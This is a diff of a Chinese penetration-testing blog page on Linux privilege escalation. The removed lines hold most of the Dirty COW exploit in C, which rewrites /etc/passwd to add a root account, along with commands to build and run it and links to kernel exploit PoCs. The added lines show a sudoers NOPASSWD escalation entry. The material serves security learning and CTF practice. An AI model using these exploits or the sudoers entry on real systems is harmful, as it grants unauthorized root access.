class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-用法：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br><span class="line">//输入密码</span><br><span class="line">su firefart//登录账号</span><br><span class="line">//记得恢复/etc/passwd</span><br></pre></td></tr></table></figure></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">CVE-2016-5195</a><br>成功范围：</li>
+<p>分为四个部分：</p>
+<ol>
+<li>组名：test</li>
+<li>组口令：一般不使用</li>
+<li>组标识码（GID）：1001</li>
+<li>组内用户列表：属于改组的所有用户列表</li>
 </ol>
-<ul>
-<li><p>RHEL7 Linux x86_64;</p>
-</li>
-<li><p>RHEL4 (4.4.7-16, with “legacy” version)</p>
-</li>
-<li><p>Debian 7 (“wheezy”);</p>
-</li>
-<li><p>Ubuntu 14.04.1 LTS</p>
-</li>
-<li><p>Ubuntu 14.04.5 LTS</p>
-</li>
-<li><p>Ubuntu 16.04.1 LTS</p>
-</li>
-<li><p>Ubuntu 16.10</p>
-</li>
-<li><p>Linux Mint 17.2<br>and compiled with:</p>
-</li>
-<li><p>clang version 4.0.0;</p>
-</li>
-<li><p>gcc version 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)</p>
-</li>
-<li><p>gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)</p>
-</li>
-<li><p>gcc version 4.8.5 20150623 (Red Hat 4.8.5-4) (GCC);</p>
-</li>
-<li><p>gcc version 4.8.4 (Ubuntu 4.8.4);</p>
-</li>
-<li><p>gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)</p>
-</li>
-<li><p>gcc version 4.7.2 (Debian 4.7.2-5);</p>
-</li>
-<li><p>gcc version 4.4.7 (with “legacy” version)</p>
-</li>
-</ul>
-<p>链接：<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40847">https://www.exploit-db.com/exploits/40847</a><br>用法：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">all: dcow</span><br><span class="line"></span><br><span class="line">dcow: dcow.cpp</span><br><span class="line">	g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line"></span><br><span class="line">strip:  dcow</span><br><span class="line">	strip ./dcow</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f dcow</span><br><span class="line">	</span><br><span class="line">Compile the program: make</span><br><span class="line"></span><br><span class="line">Start the program:</span><br><span class="line">./dcow</span><br><span class="line">or</span><br><span class="line">./dcow -s # Automatically open a root shell and restore the passwd file.</span><br><span class="line">./dcow -s -n # Automatically open a root shell but doesn&#x27;t restore the passwd file.</span><br><span class="line"></span><br><span class="line">Online help:</span><br><span class="line"></span><br><span class="line">./dcow -h</span><br></pre></td></tr></table></figure>
-<p>以下命令用于恢复/etc/passwd</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /tmp/.ssh_bak /etc/passwd</span><br><span class="line">rm /tmp/.ssh_bak</span><br></pre></td></tr></table></figure>
+<p>常见操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">查看一个用户的UID和GID</span><br><span class="line">#添加用户组</span><br><span class="line">useradd username (默认建立username用户组)</span><br><span class="line">groupadd 组帐号名称</span><br><span class="line">#修改组名</span><br><span class="line">groupmod -n newName groupName</span><br><span class="line">#删除组账号</span><br><span class="line">groupdel 组帐号名称</span><br><span class="line">注意：删除的帐号必须存在，且不能是某个用户的私有组</span><br><span class="line">#添加用户到组</span><br><span class="line">gpasswd -a userName groupName</span><br><span class="line">#从组中删除用户</span><br><span class="line">gpasswd -d userName groupName</span><br><span class="line">#查看用户属于哪个组</span><br><span class="line">groups userName</span><br><span class="line">#查看某个组有哪些用户</span><br><span class="line">tail 5 &#x2F;etc&#x2F;group 最后一行</span><br><span class="line">#查看一个用户的UID和GID</span><br><span class="line">id [options] userName eg： id bruce</span><br><span class="line">id -g userName 只显示GID</span><br><span class="line">id -G userName 显示所有组</span><br><span class="line">id -u userName 只显示UID</span><br><span class="line">#查看用户的相关信息，包括用户的主目录，启动shell，用户名等</span><br><span class="line">finger [options] userName eg: finger bruce</span><br><span class="line">finger -l userName&#x2F;&#x2F;查基本信息</span><br><span class="line">finger -s userName&#x2F;&#x2F;查登录状态</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h3><p>原理都是利用官方的exp获取了写入权限后，对/etc/passwd进行备份，然后对/etc/passwd进行重写，修改账户权限。优点方便快速。缺点受限与环境影响。某些环境下会失败。如果失败还是使用官方放出的exp，对/etc/passwd进行写入，写入前一定要记得先备份！</p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://zerokeeper.com/penetration/the-use-of-dirty-cow-dirty-cattle-loopholes-in-the-right-to-try.html">https://zerokeeper.com/penetration/the-use-of-dirty-cow-dirty-cattle-loopholes-in-the-right-to-try.html</a></p>
-<h2 id="CVE-2017-6074-DCCP双重释放漏洞-gt-2-6-18"><a href="#CVE-2017-6074-DCCP双重释放漏洞-gt-2-6-18" class="headerlink" title="CVE-2017-6074(DCCP双重释放漏洞 &gt; 2.6.18)"></a>CVE-2017-6074(DCCP双重释放漏洞 &gt; 2.6.18)</h2><p>描述：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限<br>用法:</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwn</span><br></pre></td></tr></table></figure>
-<p>POC:<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-6074">https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-6074</a></p>
-<h2 id="CVE-2016-8655（Ubuntu-12-04、14-04，Debian-7、8）"><a href="#CVE-2016-8655（Ubuntu-12-04、14-04，Debian-7、8）" class="headerlink" title="CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）"></a>CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</h2><p>描述：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限<br>用法：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chocobo_root</span><br></pre></td></tr></table></figure>
-<p>POC: <a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-92567">https://www.seebug.org/vuldb/ssvid-92567</a></p>
-<h2 id="CVE-2017-1000367-sudo本地提权漏洞"><a href="#CVE-2017-1000367-sudo本地提权漏洞" class="headerlink" title="CVE-2017-1000367(sudo本地提权漏洞)"></a>CVE-2017-1000367(sudo本地提权漏洞)</h2><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-1000367">https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-1000367</a></p>
-<h2 id="CVE-2017-1000364"><a href="#CVE-2017-1000364" class="headerlink" title="CVE-2017-1000364"></a>CVE-2017-1000364</h2><p>描述：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p>
-<h2 id="CVE-2016-1247（Nginx权限提升漏洞）"><a href="#CVE-2016-1247（Nginx权限提升漏洞）" class="headerlink" title="CVE-2016-1247（Nginx权限提升漏洞）"></a>CVE-2016-1247（Nginx权限提升漏洞）</h2><p>描述：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。<br>POC：<a target="_blank" rel="noopener" href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a><br>提权相关代码在GetRoot目录，POC中是上面提到的几个本地提权源代码，release中分别是编译好的32位和64位程序。</p>
-<h1 id="提权脚本"><a href="#提权脚本" class="headerlink" title="提权脚本"></a>提权脚本</h1><h2 id="Linux-Exploit-Suggester-pl"><a href="#Linux-Exploit-Suggester-pl" class="headerlink" title="Linux_Exploit_Suggester.pl"></a>Linux_Exploit_Suggester.pl</h2><p>根据系统内核版本号返回一个包含了可能exploits的列表</p>
+<p><img src="/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/2.png"></p>
+<h2 id="sudoers结构"><a href="#sudoers结构" class="headerlink" title="sudoers结构"></a>sudoers结构</h2><p>sudoers文件位于<code>/etc/sudoers</code></p>
+<h3 id="sudoers流程"><a href="#sudoers流程" class="headerlink" title="sudoers流程"></a>sudoers流程</h3><ol>
+<li><p>sudo需要输入密码的情况</p>
+<p>当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限<br>–&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认<br>–&gt;若密码输入成功，则开始执行sudo后续的命令</p>
+</li>
+<li><p>sudo不需要输入密码的情况</p>
+<p>1.root执行sudo时不需要输入密码(eudoers文件中有配置root ALL=(ALL) ALL这样一条规则)<br>2.欲切换的身份与执行者的身份相同，不需要输入密码<br>3./etc/sudoers文件设置为允许用户在不输入该用户的密码的情况下使用所有命令<br>如设置允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令<br>（ %wheel ALL=(ALL) NOPASSWD: ALL）</p>
+</li>
+</ol>
+<h3 id="sudoers利用"><a href="#sudoers利用" class="headerlink" title="sudoers利用"></a>sudoers利用</h3><p>可以通过设置sudoers对普通用户进行提权，比如将普通用户设置为sudo时不需要输入密码即可执行root可执行的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">visudo</span><br><span class="line">test ALL&#x3D;(ALL)NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210908111749677.png" alt="image-20210908111749677"></p>
+<h1 id="提权POC大全"><a href="#提权POC大全" class="headerlink" title="提权POC大全"></a>提权POC大全</h1><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br><a target="_blank" rel="noopener" href="http://3xp10it.cc/web/2016/09/18/%E6%8F%90%E6%9D%83/">http://3xp10it.cc/web/2016/09/18/%E6%8F%90%E6%9D%83/</a></p>
 
     </article>
     <!-- license  -->
@@ -564,7 +493,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/">https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/">October 23rd 2020, 12:54:37 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/">August 24th 2021, 9:14:16 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/">September 8th 2021, 11:18:24 am</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -709,7 +638,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">查看Linux内核版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E4%B8%8B%E7%9A%84%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.</span> <span class="toc-text">Linux下的用户权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">用户管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E5%8F%8A%E5%88%A0%E9%99%A4"><span class="toc-number">2.2.</span> <span class="toc-text">用户创建及删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84%E7%AE%A1%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">用户组管理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83POC%E5%A4%A7%E5%85%A8"><span class="toc-number">3.</span> <span class="toc-text">提权POC大全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">Docker提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUID%E4%B9%8Bfind%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">SUID之find提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PATH%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">PATH提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">AWD常用提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">7.1.</span> <span class="toc-text">0x01脏牛提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02%E5%8E%9F%E7%90%86"><span class="toc-number">7.1.1.</span> <span class="toc-text">0x02原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03%E6%B5%8B%E8%AF%95"><span class="toc-number">7.1.2.</span> <span class="toc-text">0x03测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04%E6%80%BB%E7%BB%93"><span class="toc-number">7.1.3.</span> <span class="toc-text">0x04总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.1.4.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-6074-DCCP%E5%8F%8C%E9%87%8D%E9%87%8A%E6%94%BE%E6%BC%8F%E6%B4%9E-gt-2-6-18"><span class="toc-number">7.2.</span> <span class="toc-text">CVE-2017-6074(DCCP双重释放漏洞 &gt; 2.6.18)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-8655%EF%BC%88Ubuntu-12-04%E3%80%8114-04%EF%BC%8CDebian-7%E3%80%818%EF%BC%89"><span class="toc-number">7.3.</span> <span class="toc-text">CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-1000367-sudo%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.4.</span> <span class="toc-text">CVE-2017-1000367(sudo本地提权漏洞)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-1000364"><span class="toc-number">7.5.</span> <span class="toc-text">CVE-2017-1000364</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-1247%EF%BC%88Nginx%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">7.6.</span> <span class="toc-text">CVE-2016-1247（Nginx权限提升漏洞）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC"><span class="toc-number">8.</span> <span class="toc-text">提权脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Exploit-Suggester-pl"><span class="toc-number">8.1.</span> <span class="toc-text">Linux_Exploit_Suggester.pl</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">Linux内核版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E4%B8%8B%E7%9A%84%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">1.2.</span> <span class="toc-text">Linux下的用户权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">用户管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-passwd"><span class="toc-number">1.2.2.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-shadow"><span class="toc-number">1.2.3.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA%E5%8F%8A%E5%88%A0%E9%99%A4"><span class="toc-number">1.3.</span> <span class="toc-text">用户创建及删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84%E7%AE%A1%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">用户组管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudoers%E7%BB%93%E6%9E%84"><span class="toc-number">1.5.</span> <span class="toc-text">sudoers结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoers%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text">sudoers流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoers%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">sudoers利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83POC%E5%A4%A7%E5%85%A8"><span class="toc-number">2.</span> <span class="toc-text">提权POC大全</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2503,9 +2432,76 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 111
+        Total : 114
         </div>
         <!-- search  -->
         
@@ -2522,6 +2518,21 @@ top:50vh;
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href= "/2021/09/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" >内网渗透之非约束委派攻击&约束委派攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2021/09/15/laravel%20RCE%E6%BC%8F%E6%B4%9E-CVE-2021-3129-%E5%88%A9%E7%94%A8/" >laravel RCE漏洞(CVE-2021-3129)利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/" >渗透测试之提权篇二(Linux提权)</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2824,7 +2835,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/" >渗透测试之提权篇</a>
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/" >渗透测试之提权篇一(Linux用户组及内核)</a>
         </li>
     
     
@@ -3096,6 +3107,8 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
+    
         <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
@@ -3108,8 +3121,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php反射类利用"><span class="iconfont-archer">&#xe606;</span>php反射类利用</span>
     
-        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
-    
         <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
     
         <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
@@ -3120,17 +3131,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
